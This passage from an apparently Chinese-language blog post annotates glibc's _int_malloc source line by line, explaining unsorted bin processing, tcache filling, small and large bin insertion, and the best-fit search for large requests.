大循环"></a><em><u>unsorted bin 大循环</u></em></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     </span><br><span class="hljs-comment">    it is exact fit, or, if this a small request, the chunk is remainder from     </span><br><span class="hljs-comment">    the most recent non-exact fit.  Place other traversed chunks in     </span><br><span class="hljs-comment">    bins.  Note that this step is the only place in any routine where     </span><br><span class="hljs-comment">    chunks are placed in bins.     </span><br><span class="hljs-comment">    The outer loop here is needed because we might not realize until     </span><br><span class="hljs-comment">    near the end of malloc that we should have consolidated, so must     </span><br><span class="hljs-comment">    do so and retry. This happens at most once, and only when we would     </span><br><span class="hljs-comment">    otherwise need to expand memory to service a &quot;small&quot; request.   */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br><span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br><span class="hljs-keyword">int</span> return_cached = <span class="hljs-number">0</span>;<br>tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">for</span> (;;)<br>&#123;<br>    <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) <span class="hljs-comment">// 取出链表最后一个, FIFO</span><br>    &#123;<br>        bck = victim-&gt;bk; <span class="hljs-comment">//倒数第二个</span><br>        <span class="hljs-comment">//victim过大或过小都会出错</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||                      __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem(victim), av);<br>        size = chunksize(victim);<br></code></pre></div></td></tr></table></figure><h4 id="if-small-try-last-remainder"><a href="#if-small-try-last-remainder" class="headerlink" title="if small try last remainder"></a>if small try last remainder</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">// 如果当前请求位于small chunks的大小范围内</span><br>    <span class="hljs-comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span><br>    <span class="hljs-comment">// 并且 last remainder 的大小分割后还可以作为一个 chunk</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <br>          bck == unsorted_chunks(av) &amp;&amp; <br>          victim == av-&gt;last_remainder &amp;&amp; <br>          (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE)) <span class="hljs-comment">//victim分割出nb后还有MINSIZE</span><br>      &#123;<br>          <span class="hljs-comment">/* split and reattach remainder */</span><br>          remainder_size = size - nb;<br>          <span class="hljs-comment">//分割后剩下的chunk指针</span><br>          remainder = chunk_at_offset(victim, nb);<br>          <span class="hljs-comment">//设置从unsorted bin中割出来的chunk的fd和bk</span><br>          unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>          <span class="hljs-comment">//更新last_remainer</span><br>          av-&gt;last_remainder = remainder;<br>          <span class="hljs-comment">//设置剩下的chunk的fd和bk</span><br>          remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>          &#123;<span class="hljs-comment">//如果是largechunk, 也设置一下nextsize</span><br>              remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>              remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br>          <span class="hljs-comment">//设置两个块的标记bit</span><br>          set_head(victim, nb | PREV_INUSE |<br>                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head(remainder, remainder_size | PREV_INUSE);<br>          set_foot(remainder, remainder_size);<br>          <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>          check_malloced_chunk(av, victim, nb);<br>          <span class="hljs-comment">//返回用户指针</span><br>          <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>          alloc_perturb(p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></div></td></tr></table></figure><h4 id="else-取出victim-准备放入合适的bin中"><a href="#else-取出victim-准备放入合适的bin中" class="headerlink" title="else 取出victim, 准备放入合适的bin中"></a>else 取出victim, 准备放入合适的bin中</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//如果不满足上面的条件, 就往下执行        </span><br><span class="hljs-comment">/* remove from unsorted list */</span> <br><span class="hljs-comment">//取出了victim        </span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2.28特供</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks(av)-&gt;bk = bck;        <br>bck-&gt;fd = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><h4 id="if-exact-fit-tcache-or-return"><a href="#if-exact-fit-tcache-or-return" class="headerlink" title="if exact fit, tcache or return"></a>if exact fit, tcache or return</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span> <span class="hljs-comment">//如果有刚好的chunk, 取出并返回.</span><br>        <span class="hljs-keyword">if</span> (size == nb)<br>        &#123;<br>            set_inuse_bit_at_offset(victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE <span class="hljs-comment">//用tcache就放到里面不返回. 在循环结束之后取出返回. 设置了return_cached为1. </span></span><br>            <span class="hljs-comment">/* Fill cache first, return to user only if cache fills. </span><br><span class="hljs-comment">            We may return one of these chunks later.  */</span> <br>            <span class="hljs-keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>            &#123;<br>                tcache_put(victim, tc_idx);<br>                return_cached = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>     <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span></span><br>                check_malloced_chunk(av, victim, nb);<br>                <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        &#125;<br></code></pre></div></td></tr></table></figure><h4 id="放入small-or-large-bin"><a href="#放入small-or-large-bin" class="headerlink" title="放入small or large bin"></a>放入small or large bin</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">       <span class="hljs-comment">/* place chunk in bin */</span><br><span class="hljs-comment">//这一步意味着没有刚好合适的chunk, 所以放入到相应的bin中</span><br>       <span class="hljs-keyword">if</span> (in_smallbin_range(size))<br>       &#123;<span class="hljs-comment">//如果是smallbin</span><br>           victim_index = smallbin_index(size);<br>           bck = bin_at(av, victim_index);<span class="hljs-comment">//bin数组里的chunk指针</span><br>           fwd = bck-&gt;fd;<span class="hljs-comment">//smallbin链表里的第一个chunk</span><br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<span class="hljs-comment">//如果不是small的话就是largebin了</span><br>           victim_index = largebin_index(size);<br>           bck = bin_at(av, victim_index);<br>           fwd = bck-&gt;fd;<br><br>           <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>           <span class="hljs-comment">//largebin是有顺序的(从左往右,由大至小), 要放在合适的位置, 还要设置fd_nextsize等等</span><br>           <span class="hljs-keyword">if</span> (fwd != bck)<br>           &#123;<span class="hljs-comment">//如果largebin为非空</span><br>               <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>               size |= PREV_INUSE;<br>               <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>               <span class="hljs-comment">//如果不是在main_arena呢?看来还是得学一学线程</span><br>               assert(chunk_main_arena(bck-&gt;bk));<br>               <span class="hljs-comment">//chunksize_nomask()直接取出size段, 不用位运算, 所以说speed comparison</span><br>               <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(bck-&gt;bk))<br>               &#123;<span class="hljs-comment">//victim的size小于largebin尾部(bck-&gt;bk)的最小chunk, 放到最右边</span><br>                  <span class="hljs-comment">// 令 fwd 指向 large bin 头</span><br>                   fwd = bck;<br>                   <span class="hljs-comment">// 令 bck 指向 largin bin 尾部 chunk</span><br>                   bck = bck-&gt;bk;<br>                   <span class="hljs-comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span><br>                   victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                   <span class="hljs-comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span><br>                   <span class="hljs-comment">//原来链表的第一个 chunk 指向的 bk_nextsize是原来最小的(chunk A),</span><br>                   <span class="hljs-comment">//因为这时victim比A小, 所以victim的bk_nextsize肯定是A</span><br>                   victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                   <span class="hljs-comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span><br>                   <span class="hljs-comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span><br>                   fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim<br>               &#125;<br>               <span class="hljs-keyword">else</span><br>               &#123;<br>                       <span class="hljs-comment">// 当前要插入的 victim 的大小大于最小的 chunk, 从左往右查找合适位置.</span><br>                       <span class="hljs-comment">// 判断 fwd 是否在 main arena</span><br>                       assert(chunk_main_arena(fwd));<br><span class="hljs-comment">// 从链表头部开始找到不比 victim 大的 chunk</span><br>                       <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                           fwd = fwd-&gt;fd_nextsize;<br>                           assert(chunk_main_arena(fwd));<br>                       &#125;<br>                       <span class="hljs-comment">// 如果找到了一个和 victim 一样大的 chunk，</span><br>                       <span class="hljs-comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span><br>                       <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size ==<br>                           (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask(fwd))<br>                           <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                           fwd = fwd-&gt;fd;<br>                       <span class="hljs-keyword">else</span> &#123;<br>                           <span class="hljs-comment">// 如果找到的chunk和当前victim大小不一样</span><br> <span class="hljs-comment">// 就需要构造 nextsize 双向链表,victim插入到fwd和左边一个chunk之间</span><br>                           victim-&gt;fd_nextsize              = fwd;<br>                           victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                           fwd-&gt;bk_nextsize                 = victim;<br>                           victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                       &#125;<br>                       bck = fwd-&gt;bk;<br>               &#125;<br>           &#125;<br>           <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果largebin是空的,fd_next和bk_next都指向自己就可以了</span><br>               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>       &#125;<br>   <span class="hljs-comment">//完成victim的fd和bk指针的修改, 形成bck--&gt;victim--&gt;fwd</span><br>       mark_bin(av, victim_index);<br>       victim-&gt;bk = bck;<br>       victim-&gt;fd = fwd;<span class="hljs-comment">//以上两行将victim插入到相应的链表头部中</span><br>       fwd-&gt;bk = victim;<br>       bck-&gt;fd = victim;<span class="hljs-comment">//修改bck的fd指向victim, fwd(即现在的第二个chunk)的bk指向victim</span><br></code></pre></div></td></tr></table></figure><h4 id="判断iters-大循环结尾"><a href="#判断iters-大循环结尾" class="headerlink" title="判断iters(大循环结尾)"></a>判断iters(大循环结尾)</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>        ++tcache_unsorted_count;<br>        <span class="hljs-keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>        &#123;<br>            <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS 10000</span><br>        <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-comment">//unsorted大循环结束, 避免花费过多时间在unsortedbin的处理上</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>    <span class="hljs-keyword">if</span> (return_cached)<br>    &#123;<br>        <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><h3 id="large-request"><a href="#large-request" class="headerlink" title="large request"></a><u>large request</u></h3><p>值得注意的是使用反向遍历. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//回想一下, 循环之前判断了fastbin和smallbin, 到largebin的时候先malloc_consolidate清理fastbin到unsortedbin,</span><br><span class="hljs-comment">//从unsortedbin中一个个取出,历经last_remainer,exact fit和放入相应bin中后, 循环中只判断了从unsortedbin中取出的块</span><br><span class="hljs-comment">//即合并之后的chunk,并且没有一块和nb相等.由于smallbin每个bin中chunk大小一致,也就是说两次比较smallbin中都没有合适的chunk,</span><br><span class="hljs-comment">//跳出循环之后直接找 *largechunk* 里的即可, 并且是find smallest that fits, 不一定要刚刚好</span><br>   <span class="hljs-keyword">if</span> (!in_smallbin_range(nb))<br>   &#123;<br>       bin = bin_at(av, idx); <span class="hljs-comment">//idx是nb定位出来的idx,在大循环之前,到这里说明是largebin_idx</span><br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb))<br>       &#123;<span class="hljs-comment">//如果该largebin非空 且 最大的不小于nb</span><br>           <span class="hljs-comment">//为了反向遍历,victim指向最后一个最小的largechunk</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-comment">//找出第一个不小于nb的块, 并且赋值size为这个chunk的大小</span><br>           <span class="hljs-comment">//如果有多个相同大小的chunk, victim会定位到第一个有fd_nextsize指针的chunk</span><br>           <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size = chunksize(victim)) &lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">//如果从largebin链表中选取的victim不是链表中的最后一个chunk,并且与victim大小相同的chunk不止一个</span><br>           <span class="hljs-comment">//意味着victim为chunk size链表中的节点</span><br>           <span class="hljs-comment">//为了避免调整chunksize链表, 将victim的fd作为候选chunk</span><br>           <span class="hljs-keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))<br>               victim = victim-&gt;fd;<br>           <br>   <span class="hljs-comment">//准备分割,unlink取出victim</span><br>           remainder_size = size - nb;<br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//如果剩下的小于MINSIZE就把整个victim给出去</span><br>               <span class="hljs-comment">//例行设置inuse_bit和non_main_arena_bit</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><span class="hljs-comment">//如果过大就要分割, 取前面一部分, 多出来的放到unsorted bin</span><br>           &#123;<br>               remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//取出剩下的chunk指针, 前面写过相关过程</span><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               <span class="hljs-comment">//插入unsortedbin头部</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<span class="hljs-comment">//简单的检查,防止fwd被篡改</span><br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<span class="hljs-comment">//插入完成</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<span class="hljs-comment">//largebin就设置一下</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="Search-for-next-largest-bin"><a href="#Search-for-next-largest-bin" class="headerlink" title="Search for next largest bin"></a>Search for next largest bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">        bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">        (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">        that fits is 